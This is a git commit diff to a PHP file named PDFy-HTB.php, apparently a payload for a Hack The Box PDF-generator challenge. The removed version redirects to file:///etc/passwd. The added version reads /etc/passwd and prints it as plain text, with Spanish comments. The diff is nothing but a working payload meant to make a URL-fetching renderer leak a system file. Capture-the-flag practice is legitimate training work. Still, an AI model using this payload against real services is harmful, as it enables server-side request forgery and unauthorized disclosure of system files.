0f4d098098b55770d8c73b96796f6a4e210f4fca
j05145 <162765050+j05145@users.noreply.github.com>
2024-06-15 14:07:57 -0400

    Update PDFy-HTB.php

--- PDFy-HTB.php
+++ PDFy-HTB.php
@@ -1,9 +1,11 @@
-<!DOCTYPE html>
-<html>
-<body>
-<h1>System Command Output:</h1>
 <?php
-header('location:file:///etc/passwd);
+$file = '/etc/passwd';
+if (file_exists($file)) {
+    // Leer y mostrar el contenido del archivo
+    $content = file_get_contents($file);
+    header('Content-Type: text/plain'); // Establecer tipo de contenido como texto plano
+    echo $content;
+} else {
+    echo "El archivo $file no existe.";
+}
 ?>
-</body>
-</html>
